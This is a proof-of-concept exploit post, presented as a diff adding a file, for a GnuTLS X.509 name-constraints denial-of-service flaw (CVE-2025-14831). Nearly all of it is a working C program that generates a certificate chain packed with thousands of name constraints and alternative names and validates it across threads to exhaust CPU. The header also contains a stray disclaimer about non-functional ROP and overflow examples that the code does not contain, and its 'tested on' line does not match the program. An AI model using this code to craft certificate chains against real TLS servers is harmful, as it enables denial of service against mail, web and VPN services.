@@ -1,0 +1,587 @@
+=============================================================================================================================================
+| # Title     : GnuTLS X.509 Name Constraints Denial-of-Service Resource Exhaustion PoC                                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.gnutls.org/reference/gnutls-x509.html                                                                           |
+=============================================================================================================================================
+
+[+] Summary    :  This program is a multi-threaded test application created to analyze the impact of excessive X.509 Name Constraints processing in vulnerable versions of GnuTLS (CVE-2025-14831).
+                  It generates a configurable certificate chain and attaches a very large number of Name Constraints and Subject Alternative Names (SANs) to CA certificates. 
+				  The chain is then validated using the GnuTLS 3.x API while execution time is measured. By increasing the number of constraints and running validation concurrently 
+				  across multiple threads, the program demonstrates how certificate verification may consume excessive CPU resources.
+                  The issue affects unpatched versions of GnuTLS and may allow denial-of-service (DoS) conditions through resource exhaustion during certificate validation. 
+				  Systems relying on GnuTLS for TLS verification (such as web servers, mail servers, and VPN services) may be impacted if they process specially crafted certificate chains.
+                  Mitigation requires upgrading to patched GnuTLS versions provided by the distribution vendor and ensuring proper resource limits and monitoring are in place.
+
+[+] Important: The ROP demonstration and overflow examples are intentionally non-functional and strictly educational. 
+               The framework does not perform real exploitation but illustrates how protection mechanisms interact at a systems level.
+
+[+] POC   : Compilation:  gcc -o poc poc.c -lgnutls -lpthread -O2 -Wall -Wextra Usage : ./poc [chain_length] [name_constraints_count] [threads]
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <assert.h>
+#include <sys/time.h>
+#include <gnutls/gnutls.h>
+#include <gnutls/x509.h>
+#include <pthread.h>
+#include <errno.h>
+#include <time.h>
+#include <limits.h>
+#include <stdint.h>
+#if UINTPTR_MAX == 0xffffffff
+
+    #define CERT_TIME 0x7FFFFFFF  
+#else
+
+    #define CERT_TIME 4102444800ULL  
+#endif
+#define MAX_CHAIN_LEN 10
+#define DEFAULT_CHAIN_LEN 3
+#define DEFAULT_CONSTRAINTS 5000
+#define MAX_CONSTRAINTS 20000
+#if GNUTLS_VERSION_NUMBER >= 0x030400
+#define HAVE_NAME_CONSTRAINTS 1
+#else
+#define HAVE_NAME_CONSTRAINTS 0
+#endif
+#ifndef GNUTLS_FSAN_APPEND
+#define GNUTLS_FSAN_APPEND 1
+#endif
+
+typedef struct {
+    int chain_length;
+    int constraints_count;
+    gnutls_x509_crt_t *certs;      /* Full certificate chain (leaf first) */
+    gnutls_x509_crt_t *ca_certs;    /* Trusted CA certificates (root only) */
+    int ca_count;
+} attack_params_t;
+
+static int generate_ca_cert(gnutls_x509_crt_t *cert, gnutls_x509_privkey_t *key,
+                           const char *dn, int is_root,
+                           gnutls_x509_crt_t sign_cert,
+                           gnutls_x509_privkey_t sign_key);
+static int add_name_constraints_compat(gnutls_x509_crt_t cert, int count);
+static int add_subject_alt_names(gnutls_x509_crt_t cert, int count);
+static int add_critical_extensions(gnutls_x509_crt_t cert);
+static void print_time_diff(struct timeval *start, struct timeval *end);
+static void *attack_thread(void *arg);
+static void cleanup_certificate_chain(gnutls_x509_crt_t *certs, 
+                                      gnutls_x509_privkey_t *keys, int count);
+static long safe_strtol(const char *str, int min, int max, int default_val);
+static int generate_serial(gnutls_x509_crt_t cert);
+static int verify_certificate_chain(gnutls_x509_crt_t *chain, int chain_len,
+                                    gnutls_x509_crt_t *trusted, int trusted_len,
+                                    unsigned int *output);
+
+static int gnutls_initialized = 0;
+static pthread_mutex_t init_mutex = PTHREAD_MUTEX_INITIALIZER;
+static long safe_strtol(const char *str, int min, int max, int default_val) {
+    char *endptr;
+    long val;
+    
+    if (str == NULL || *str == '\0') {
+        return default_val;
+    }
+    
+    errno = 0;
+    val = strtol(str, &endptr, 10);
+    
+    if (errno != 0 || endptr == str || *endptr != '\0') {
+        fprintf(stderr, "Warning: Invalid number '%s', using default %d\n", 
+                str, default_val);
+        return default_val;
+    }
+    
+    if (val < min || val > max) {
+        fprintf(stderr, "Warning: Value %ld out of range [%d-%d], using default %d\n",
+                val, min, max, default_val);
+        return default_val;
+    }
+    
+    return val;
+}
+
+static int generate_serial(gnutls_x509_crt_t cert) {
+    unsigned char serial_bytes[8];
+    gnutls_datum_t serial;
+    int ret;
+    FILE *urandom;
+    static uint64_t counter = 0;
+    static pthread_mutex_t counter_mutex = PTHREAD_MUTEX_INITIALIZER;
+
+    urandom = fopen("/dev/urandom", "r");
+    if (urandom) {
+        size_t read = fread(serial_bytes, 1, sizeof(serial_bytes), urandom);
+        fclose(urandom);
+        
+        if (read == sizeof(serial_bytes)) {
+            serial.data = serial_bytes;
+            serial.size = sizeof(serial_bytes);
+            ret = gnutls_x509_crt_set_serial(cert, &serial);
+            if (ret >= 0) return 0;
+        }
+    }
+
+    pthread_mutex_lock(&counter_mutex);
+    uint64_t time_serial = (uint64_t)time(NULL) ^ (counter++);
+    pthread_mutex_unlock(&counter_mutex);
+    
+    serial.data = (unsigned char*)&time_serial;
+    serial.size = sizeof(time_serial);
+    ret = gnutls_x509_crt_set_serial(cert, &serial);
+    
+    return (ret >= 0) ? 0 : ret;
+}
+
+static int generate_ca_cert(gnutls_x509_crt_t *cert, gnutls_x509_privkey_t *key,
+                           const char *dn, int is_root,
+                           gnutls_x509_crt_t sign_cert,
+                           gnutls_x509_privkey_t sign_key) {
+    int ret;
+    time_t now = time(NULL);
+    time_t expire = (time_t)CERT_TIME;
+    unsigned int key_usage;
+
+    ret = gnutls_x509_crt_init(cert);
+    if (ret < 0) return ret;
+    
+    ret = gnutls_x509_privkey_init(key);
+    if (ret < 0) {
+        gnutls_x509_crt_deinit(*cert);
+        return ret;
+    }
+
+    ret = gnutls_x509_privkey_generate(*key, GNUTLS_PK_RSA, 2048, 0);
+    if (ret < 0) {
+        gnutls_x509_privkey_deinit(*key);
+        gnutls_x509_crt_deinit(*cert);
+        return ret;
+    }
+
+    ret = gnutls_x509_crt_set_version(*cert, 3);
+    if (ret < 0) goto error;
+    ret = generate_serial(*cert);
+    if (ret < 0) goto error;
+
+    ret = gnutls_x509_crt_set_activation_time(*cert, now);
+    if (ret < 0) goto error;
+    if (expire <= now) {
+        expire = now + (365 * 24 * 3600); 
+    }
+    ret = gnutls_x509_crt_set_expiration_time(*cert, expire);
+    if (ret < 0) goto error;
+
+    ret = gnutls_x509_crt_set_dn_by_oid(*cert, GNUTLS_OID_X520_COMMON_NAME, 0,
+                                        dn, strlen(dn));
+    if (ret < 0) goto error;
+
+    ret = gnutls_x509_crt_set_basic_constraints(*cert, 1, 
+                                                is_root ? -1 : 0);
+    if (ret < 0) goto error;
+
+    key_usage = GNUTLS_KEY_KEY_CERT_SIGN | GNUTLS_KEY_CRL_SIGN;
+    if (!is_root) {
+        key_usage |= GNUTLS_KEY_DIGITAL_SIGNATURE;
+    }
+    ret = gnutls_x509_crt_set_key_usage(*cert, key_usage);
+    if (ret < 0) goto error;
+
+    ret = add_critical_extensions(*cert);
+    if (ret < 0) goto error;
+
+    if (is_root) {
+
+        ret = gnutls_x509_crt_sign2(*cert, *cert, *key, GNUTLS_DIG_SHA256, 0);
+    } else {
+
+        ret = gnutls_x509_crt_sign2(*cert, sign_cert, sign_key, 
+                                    GNUTLS_DIG_SHA256, 0);
+    }
+    
+    if (ret < 0) goto error;
+    
+    return 0;
+    
+error:
+    gnutls_x509_privkey_deinit(*key);
+    gnutls_x509_crt_deinit(*cert);
+    return ret;
+}
+
+static int add_critical_extensions(gnutls_x509_crt_t cert) {
+    int ret;
+
+    ret = gnutls_x509_crt_set_ca_status(cert, 1);
+    if (ret < 0) return ret;
+    
+    return 0;
+}
+
+#if HAVE_NAME_CONSTRAINTS
+
+static int add_name_constraints_compat(gnutls_x509_crt_t cert, int count) {
+    int ret, i;
+    char dns_name[256];
+    gnutls_x509_name_constraints_t nc;
+    
+    ret = gnutls_x509_name_constraints_init(&nc);
+    if (ret < 0) {
+        fprintf(stderr, "Failed to initialize name constraints: %s\n", 
+                gnutls_strerror(ret));
+        return ret;
+    }
+    
+    for (i = 0; i < count; i++) {
+
+        if (i % 2 == 0) {
+            snprintf(dns_name, sizeof(dns_name), "subdomain%d.example.com", i);
+            ret = gnutls_x509_name_constraints_add_permitted(nc, 
+                                                             GNUTLS_SAN_DNSNAME,
+                                                             dns_name, 
+                                                             strlen(dns_name));
+        } else {
+            snprintf(dns_name, sizeof(dns_name), "excluded%d.example.org", i);
+            ret = gnutls_x509_name_constraints_add_excluded(nc, 
+                                                            GNUTLS_SAN_DNSNAME,
+                                                            dns_name, 
+                                                            strlen(dns_name));
+        }
+        
+        if (ret < 0) {
+            fprintf(stderr, "Warning: Failed to add name constraint %d: %s\n", 
+                    i, gnutls_strerror(ret));
+        }
+        
+
+        if (i % 10 == 0) {
+            snprintf(dns_name, sizeof(dns_name), "https://site%d.example.com", i);
+            gnutls_x509_name_constraints_add_permitted(nc, GNUTLS_SAN_URI,
+                                                       dns_name, strlen(dns_name));
+            
+            snprintf(dns_name, sizeof(dns_name), "user%d@example.com", i);
+            gnutls_x509_name_constraints_add_excluded(nc, GNUTLS_SAN_RFC822NAME,
+                                                      dns_name, strlen(dns_name));
+        }
+    }
+
+    ret = gnutls_x509_crt_set_name_constraints(cert, nc, 1); /* Critical = 1 */
+    if (ret < 0) {
+        fprintf(stderr, "Failed to set name constraints: %s\n", gnutls_strerror(ret));
+    }
+    
+    gnutls_x509_name_constraints_deinit(nc);
+    return ret;
+}
+
+#else /* !HAVE_NAME_CONSTRAINTS */
+
+static int add_name_constraints_compat(gnutls_x509_crt_t cert, int count) {
+    int i;
+    char san[256];
+    int ret = 0;
+    
+    fprintf(stderr, "Note: Using fallback method (no native name constraints)\n");
+
+    for (i = 0; i < count; i++) {
+        snprintf(san, sizeof(san), "dummy%d.example.com", i);
+        ret = gnutls_x509_crt_set_subject_alt_name(cert, 
+                                                   GNUTLS_SAN_DNSNAME,
+                                                   san, strlen(san),
+                                                   GNUTLS_FSAN_APPEND);
+        if (ret < 0 && ret != GNUTLS_E_ASN1_ELEMENT_NOT_FOUND) {
+            fprintf(stderr, "Warning: Failed to add fallback SAN %d: %s\n", 
+                    i, gnutls_strerror(ret));
+        }
+    }
+    
+    return 0;
+}
+
+#endif /* HAVE_NAME_CONSTRAINTS */
+
+static int add_subject_alt_names(gnutls_x509_crt_t cert, int count) {
+    int ret, i;
+    char san[256];
+    
+    for (i = 0; i < count; i++) {
+        switch (i % 4) {
+            case 0:
+                snprintf(san, sizeof(san), "host%d.example.com", i);
+                ret = gnutls_x509_crt_set_subject_alt_name(cert, 
+                                                          GNUTLS_SAN_DNSNAME,
+                                                          san, strlen(san),
+                                                          GNUTLS_FSAN_APPEND);
+                break;
+                
+            case 1:
+                snprintf(san, sizeof(san), "https://resource%d.example.org/path", i);
+                ret = gnutls_x509_crt_set_subject_alt_name(cert, 
+                                                          GNUTLS_SAN_URI,
+                                                          san, strlen(san),
+                                                          GNUTLS_FSAN_APPEND);
+                break;
+                
+            case 2:
+                snprintf(san, sizeof(san), "user%d@company.com", i);
+                ret = gnutls_x509_crt_set_subject_alt_name(cert, 
+                                                          GNUTLS_SAN_RFC822NAME,
+                                                          san, strlen(san),
+                                                          GNUTLS_FSAN_APPEND);
+                break;
+                
+            case 3: {
+
+                unsigned char ip[4];
+                ip[0] = 10;
+                ip[1] = 0;
+                ip[2] = 0;
+                ip[3] = (unsigned char)(i % 256);
+
+                ret = gnutls_x509_crt_set_subject_alt_name(cert, 
+                                                          GNUTLS_SAN_IPADDRESS,
+                                                          (const char*)ip, 4,
+                                                          GNUTLS_FSAN_APPEND);
+                break;
+            }
+        }
+        
+        if (ret < 0 && ret != GNUTLS_E_ASN1_ELEMENT_NOT_FOUND) {
+            fprintf(stderr, "Warning: Failed to add SAN %d: %s\n", 
+                    i, gnutls_strerror(ret));
+        }
+    }
+    
+    return 0;
+}
+
+static int verify_certificate_chain(gnutls_x509_crt_t *chain, int chain_len,
+                                    gnutls_x509_crt_t *trusted, int trusted_len,
+                                    unsigned int *output) {
+    /* Correct signature for GnuTLS 3.x */
+    return gnutls_x509_crt_list_verify(chain, chain_len,
+                                       trusted, trusted_len,
+                                       NULL, 0,  /* No CRLs */
+                                       0,        /* No flags */
+                                       output);
+}
+
+static void print_time_diff(struct timeval *start, struct timeval *end) {
+    long seconds = end->tv_sec - start->tv_sec;
+    long microseconds = end->tv_usec - start->tv_usec;
+    
+    if (microseconds < 0) {
+        seconds--;
+        microseconds += 1000000;
+    }
+    
+    printf("Time taken: %ld.%06ld seconds\n", seconds, microseconds);
+}
+
+static void *attack_thread(void *arg) {
+    attack_params_t *params = (attack_params_t *)arg;
+    int ret;
+    unsigned int verify_output = 0;
+    struct timeval start, end;
+    unsigned long thread_id = (unsigned long)pthread_self();
+    
+    printf("[Thread %lu] Starting validation with %d name constraints\n", 
+           thread_id, params->constraints_count);
+    
+    gettimeofday(&start, NULL);
+
+    ret = verify_certificate_chain(params->certs, params->chain_length,
+                                   params->ca_certs, params->ca_count,
+                                   &verify_output);
+    
+    gettimeofday(&end, NULL);
+    
+    if (ret < 0) {
+        printf("[Thread %lu] Verification failed: %s\n", 
+               thread_id, gnutls_strerror(ret));
+    } else {
+        printf("[Thread %lu] Verification completed with status: %s\n",
+               thread_id,
+               verify_output == 0 ? "Valid" : "Invalid");
+    }
+    
+    printf("[Thread %lu] ", thread_id);
+    print_time_diff(&start, &end);
+    
+    return NULL;
+}
+
+static void cleanup_certificate_chain(gnutls_x509_crt_t *certs, 
+                                      gnutls_x509_privkey_t *keys, int count) {
+    int i;
+    for (i = 0; i < count; i++) {
+        if (certs[i] != NULL) {
+            gnutls_x509_crt_deinit(certs[i]);
+            certs[i] = NULL;
+        }
+        if (keys[i] != NULL) {
+            gnutls_x509_privkey_deinit(keys[i]);
+            keys[i] = NULL;
+        }
+    }
+}
+
+int main(int argc, char **argv) {
+    int ret, i;
+    int chain_length = DEFAULT_CHAIN_LEN;
+    int constraints_count = DEFAULT_CONSTRAINTS;
+    gnutls_x509_crt_t certs[MAX_CHAIN_LEN] = {NULL};
+    gnutls_x509_privkey_t keys[MAX_CHAIN_LEN] = {NULL};
+    gnutls_x509_crt_t ca_certs[1] = {NULL};
+    char dn[256];
+    struct timeval total_start, total_end;
+    pthread_t *threads = NULL;
+    int num_threads = 1;
+    attack_params_t *thread_params = NULL;
+
+    if (argc > 1) {
+        chain_length = (int)safe_strtol(argv[1], 1, MAX_CHAIN_LEN, DEFAULT_CHAIN_LEN);
+    }
+    
+    if (argc > 2) {
+        constraints_count = (int)safe_strtol(argv[2], 1, MAX_CONSTRAINTS, DEFAULT_CONSTRAINTS);
+    }
+    
+    if (argc > 3) {
+        num_threads = (int)safe_strtol(argv[3], 1, 32, 1);
+    }
+    
+    printf("\nCVE-2025-14831 GnuTLS Name Constraints DoS PoC \n");
+    printf("==================================================\n");
+    printf("Chain length: %d certificates\n", chain_length);
+    printf("Name constraints per CA: %d\n", constraints_count);
+    printf("Threads: %d\n", num_threads);
+    printf("System: %d-bit\n", (int)(sizeof(void*) * 8));
+    printf("GnuTLS version: %s\n", gnutls_check_version(NULL));
+#if HAVE_NAME_CONSTRAINTS
+    printf("Name constraints API: Available\n");
+#else
+    printf("Name constraints API: Not available (using fallback)\n");
+#endif
+    printf("\n[!] Warning: This will generate a malicious certificate chain\n");
+    printf("    with excessive extensions. System may become unresponsive.\n\n");
+    
+    /* Initialize GnuTLS once */
+    pthread_mutex_lock(&init_mutex);
+    if (!gnutls_initialized) {
+        gnutls_global_init();
+        gnutls_initialized = 1;
+    }
+    pthread_mutex_unlock(&init_mutex);
+    
+    gettimeofday(&total_start, NULL);
+
+    printf("[*] Generating certificate chain...\n");
+    
+    for (i = 0; i < chain_length; i++) {
+        int idx = chain_length - 1 - i;  /* Root at highest index */
+        snprintf(dn, sizeof(dn), "CVE-2025-14831 Level %d CA", i);
+        
+        if (i == 0) {
+            ret = generate_ca_cert(&certs[idx], &keys[idx], dn, 1, NULL, NULL);
+            if (ret == 0) {
+                ca_certs[0] = certs[idx];
+            }
+        } else {
+
+            ret = generate_ca_cert(&certs[idx], &keys[idx], dn, 0,
+                                   certs[idx+1], keys[idx+1]);
+        }
+        
+        if (ret < 0) {
+            fprintf(stderr, "Failed to generate certificate at level %d: %s\n",
+                    i, gnutls_strerror(ret));
+            goto cleanup;
+        }
+
+        printf("[*] Adding %d name constraints to Level %d CA...\n", 
+               constraints_count, i);
+        ret = add_name_constraints_compat(certs[idx], constraints_count);
+        if (ret < 0) {
+            fprintf(stderr, "Warning: Failed to add name constraints: %s\n",
+                    gnutls_strerror(ret));
+        }
+
+        printf("[*] Adding %d SANs to Level %d CA...\n", 
+               constraints_count, i);
+        ret = add_subject_alt_names(certs[idx], constraints_count);
+        if (ret < 0) {
+            fprintf(stderr, "Warning: Failed to add SANs: %s\n",
+                    gnutls_strerror(ret));
+        }
+        
+        printf("    Certificate %d generated: %s\n", i, dn);
+    }
+    
+    printf("[*] Certificate generation complete\n\n");
+    printf("[*] Launching %d threads...\n", num_threads);
+    
+    threads = calloc(num_threads, sizeof(pthread_t));
+    thread_params = calloc(num_threads, sizeof(attack_params_t));
+    
+    if (!threads || !thread_params) {
+        fprintf(stderr, "Memory allocation failed\n");
+        goto cleanup;
+    }
+    
+    for (i = 0; i < num_threads; i++) {
+        thread_params[i].chain_length = chain_length;
+        thread_params[i].constraints_count = constraints_count;
+        thread_params[i].certs = certs;
+        thread_params[i].ca_certs = ca_certs;
+        thread_params[i].ca_count = 1;
+        
+        ret = pthread_create(&threads[i], NULL, attack_thread, &thread_params[i]);
+        if (ret != 0) {
+            fprintf(stderr, "Failed to create thread %d: %s\n", i, strerror(ret));
+            num_threads = i;
+            break;
+        }
+    }
+
+    for (i = 0; i < num_threads; i++) {
+        pthread_join(threads[i], NULL);
+    }
+    
+    gettimeofday(&total_end, NULL);
+    
+    printf("\n[*] All threads completed\n");
+    printf("[*] Total ");
+    print_time_diff(&total_start, &total_end);
+    printf("\n[*] Resource exhaustion analysis:\n");
+    printf("    - Each thread processed %d name constraints\n", constraints_count);
+    printf("    - Total constraints: %d (CAs) * %d = %d per validation\n",
+           chain_length, constraints_count, chain_length * constraints_count);
+    printf("    - Expected O(n²) complexity with high constraint counts\n");
+    
+cleanup:
+
+    printf("\n[*] Cleaning up...\n");
+    ca_certs[0] = NULL;
+    
+    cleanup_certificate_chain(certs, keys, chain_length);
+    
+    if (threads) free(threads);
+    if (thread_params) free(thread_params);
+    
+    if (gnutls_initialized) {
+        gnutls_global_deinit();
+        gnutls_initialized = 0;
+    }
+    
+    printf("[*] PoC completed\n");
+    return 0;
+}
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
